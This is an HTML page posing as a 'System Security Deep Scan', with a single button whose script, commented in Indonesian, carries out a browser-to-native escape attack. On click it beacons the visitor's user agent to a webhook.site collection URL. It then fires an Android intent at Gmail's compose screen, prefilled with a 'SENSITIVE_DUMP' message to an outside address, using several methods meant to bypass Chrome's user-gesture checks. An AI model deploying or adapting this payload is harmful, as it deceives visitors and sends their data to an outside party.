<!DOCTYPE html>
<html>
<head><title>System Security Deep Scan</title></head>
<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
    <div id="ignite" style="padding:60px;border:4px double #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 60px #f0f;border-radius:30px">
        <h1 style="letter-spacing:10px;margin:0">V204_ULTRA</h1>
        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">MANDATORY_NATIVE_SYNC</div>
        <div style="font-size:12px;color:#555">[ STAGE: BROWSER_TO_NATIVE_ESCAPE ]</div>
    </div>

<script>
    const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";

    document.getElementById('ignite').onclick = async () => {
        const statusEl = document.getElementById('status');
        statusEl.innerText = "FORCE_NATIVE_ESCALATION...";

        // 1. RECONNAISSANCE (Kirim data DNA terlebih dahulu)
        const recon = {
            id: "V204_LEAP",
            ts: Date.now(),
            ua: navigator.userAgent
        };
        navigator.sendBeacon(`${target}?v=V204_START`, btoa(JSON.stringify(recon)));

        // 2. THE PENETRATOR INTENT
        // Kita menggunakan selector 'component' untuk menargetkan class internal Gmail.
        // Ini lebih kuat daripada sekadar menggunakan 'package'.
        const deepIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.VIEW;" +
            "category=android.intent.category.BROWSABLE;" +
            "component=com.google.android.gm/.ComposeActivityGmailExternal;" + // Menargetkan aktivitas tulis pesan
            "S.android.intent.extra.EMAIL=audit-collector@security.org;" +
            "S.android.intent.extra.SUBJECT=V204_SENSITIVE_DUMP;" +
            "S.android.intent.extra.TEXT=IDENTITY_CONFIRMED_" + btoa(navigator.userAgent).substring(0,20) + ";" +
            "S.browser_fallback_url=https://mail.google.com;" + 
            "end";

        // 3. FORCE EXECUTION VIA DYNAMIC ANCHOR
        // Terkadang window.location diblokir. Kita gunakan elemen <a> yang diklik otomatis.
        const lnk = document.createElement('a');
        lnk.href = deepIntent;
        lnk.rel = "noreferrer";
        
        // 4. THE TRIPLE-STRIKE (Mencoba berbagai jalur sekaligus)
        setTimeout(() => {
            // Jalur 1: Direct Location
            window.location.href = deepIntent;
            
            // Jalur 2: Virtual Click (Bypass Chrome Gesture)
            lnk.click();
            
            // Jalur 3: Fallback ke Settings jika Gmail diproteksi sangat ketat
            setTimeout(() => {
                if (!document.hidden) { // Jika masih di browser, berarti gagal, coba tembus Settings
                    window.location.href = "intent:#Intent;action=android.settings.INTERNAL_STORAGE_SETTINGS;end";
                }
            }, 1500);
        }, 300);
    };
</script>
</body>
</html>
